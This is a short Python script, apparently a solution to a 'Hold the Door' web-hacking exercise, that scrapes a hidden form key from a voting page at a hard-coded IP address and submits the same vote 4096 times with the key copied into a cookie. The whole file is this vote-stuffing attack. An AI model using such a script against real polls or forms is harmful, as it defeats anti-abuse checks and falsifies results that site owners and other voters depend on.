#!/usr/bin/python3
""" Module that executes HTTP POST request """

from bs4 import BeautifulSoup
import requests

url = 'http://158.69.76.135/level1.php'
payload = {'id': '498', 'holdthedoor': 'Submit'}


def vote():
    """ Method that POSTS with an updated header """

    for i in range(4096):

        # check server is up
        response = requests.get(url)
        if response != 200:
            print("HTTP response {}".format(response))

        # get the cookie from the header
        dom = BeautifulSoup(response.text, 'html.parser')
        cookie = dom.find('input', attrs={'name': 'key'})['value']

        # set the header and payload
        headers = {'Cookie': 'HoldTheDoor={}'.format(cookie)}
        payload.update({'key': cookie})

        send = requests.post(url, data=payload, headers=headers)

if __name__ == '__main__':
    vote()
